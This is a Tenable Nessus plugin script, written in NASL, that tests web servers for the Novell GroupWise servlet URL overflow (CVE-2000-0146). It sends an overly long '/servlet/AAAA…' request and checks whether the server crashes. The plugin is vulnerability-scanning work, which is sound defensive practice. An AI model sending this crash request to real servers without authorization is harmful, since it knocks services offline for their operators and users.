#TRUSTED 695cdd6198ffe2d258d93255424a2e039000fb38012b9565459c690fae77a7294611f6b7cbed9b1b6fc41bfc34231032e8d8702c3f787537e45dab0da02f76a03d7fd3927e640f76d07a667c95c8cb3f7b6822f9ced56e248dd1ea0745551e3ead426d2b205526ad3e8e9f5d6a62fc4b9d4cddd51c7371a559f8823bf34849f4c5df244466402634b3de7b90489ea29fcbeda241e330cdf0420db16b89f0c7bd840c35e520ea3f6219a06fd4f7a8c9c2cc18aa40c87737ad7e432f3a13ff19edbf47f8429f619fe6e4db023cd3f0f18962ea46f6f4ba769ee27a00979399d0a472ec50c0dd1908aa7e763e8d55e39d30bad99f7e790efdd8bc8fe45b7beaa3b3d3eb4bdde5d863476d1f2fcac926679bb5ea74f1eccc134598e215d4bc48ddd3286c5f9ff9fbf3541a3961535d3a08a3aaf09267d3a4890dec089d6b0fe9f6bc5ed124e2e8c80a6c164b24112d920bf5c57cef8c411c7ef0c8ef8c4b8259287b1c93bf758452cc2ad9f4090a8e1038dc1250e9a76abc387861188303a8ea0f19e9b8f7ab44a3250c569686ffa2811f3e6ea0ed197edc96bf1526ccd7b54ab6a9153219ea4947c2cc73808d1440b2676cfb4c09e5a4e8811f6779ebf8bcbb6108badf9c49a3468ce2324d25925055cd3141c291762ce757e7b01f64143e53c4bfa6a8316347fb02761a3c30e23c51ff5d9f95ae429ad1f7a19caff8b38a896022
#
# (C) Tenable Network Security, Inc.
#

# Axel Nennker axel@nennker.de
# I got false positive from this script in revision 1.7
# Therefore I added an extra check before the attack and
# rephrased the description. 20020306


include('compat.inc');

if(description)
{
  script_id(10097);
  script_version("1.29");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/16");
  
  script_cve_id("CVE-2000-0146");
  script_bugtraq_id(972);

  script_name(english:"Novell GroupWise Enhancement Pack Java Server URL Handling Overflow DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
  script_set_attribute(attribute:"description", value:
"The remote web server can be crashed by an overly long request:
	GET /servlet/AAAA...AAAA
This attack is known to affect GroupWise servers." );
  script_set_attribute(attribute:"solution", value:
"If the server is a Groupwise server, then install GroupWise Enhancement Pack 5.5 Sp1." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2000-0146");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Based on analysis of vendor advisory.");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value: "2000/02/08");
  script_set_attribute(attribute:"vuln_publication_date", value: "2000/02/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english: "This script is Copyright (C) 2000-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_family(english: "Web Servers");

  script_dependencies("find_service1.nasl", "www_too_long_url.nasl");
  script_exclude_keys("www/too_long_url_crash");
  script_require_ports("Services/www", 80);
  exit(0);
}

include('http.inc');

# if the server already crashes because of a too long
# url, go away

var port;
var affected = FALSE;
var too_long = get_kb_item("www/too_long_url_crash");

if(too_long) audit(AUDIT_RESP_NOT, port);

var port = get_http_port(default:80);
if (!get_port_state(port) || http_is_dead(port:port)) audit(AUDIT_PORT_CLOSED, port);

# now try to crash the server
var http_send = http_send_recv3(port: port, method: 'GET', item: strcat('/servlet/', crap(400)));

if (http_is_dead(port: port, retry: 3))
{
  affected = TRUE;

  var report = '\nThe remote web server on port ' + port +
  ' appears to have crashed by an overly long request\n'+ http_last_sent_request();

  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
}
if(!affected) audit(AUDIT_HOST_NOT, "affected");
